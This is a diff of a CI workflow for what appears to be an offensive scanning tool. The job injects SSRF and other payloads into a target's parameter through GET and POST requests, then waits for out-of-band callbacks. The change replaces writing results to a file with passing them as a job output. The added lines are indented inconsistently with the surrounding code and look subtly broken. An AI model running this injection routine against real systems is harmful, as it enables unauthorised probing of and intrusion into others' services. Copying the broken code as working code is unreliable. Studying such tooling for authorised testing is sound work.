@@ -79,7 +79,6 @@ jobs:
         if not target.startswith("http"):
             target = f"https://{target}"
 
-        # Build payload sets
         payloads = []
 
         if payload_type in ("ssrf", "all"):
@@ -114,7 +113,6 @@ jobs:
         print(f"[*] Injecting {len(payloads)} payloads into {param} @ {target}")
         for name, payload in payloads:
             try:
-                # GET injection
                 resp = client.get(
                     target,
                     params={param: payload},
@@ -128,7 +126,6 @@ jobs:
                 sent += 1
 
             try:
-                # POST injection
                 resp = client.post(
                     target,
                     data={param: payload},
@@ -143,15 +140,11 @@ jobs:
 
             time.sleep(0.3)
 
-        out_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_oob_payloads.json"
-        with open(out_file, "w") as f:
-            json.dump(results, f, indent=2)
+         print(f"\n[+] Sent {sent} injection requests")
+         print("[*] Waiting 15s for OOB callbacks to register ...")
+         time.sleep(15)
 
-        print(f"\n[+] Sent {sent} injection requests")
-        print("[*] Waiting 15s for OOB callbacks to register ...")
-        time.sleep(15)
-
-        add_outputs(injection_count=sent, payloads_file=out_file)
+         add_outputs(injection_count=sent, payload_results=json.dumps(results))
   verify:
     name: Verify Callbacks
     needs: [setup, inject]
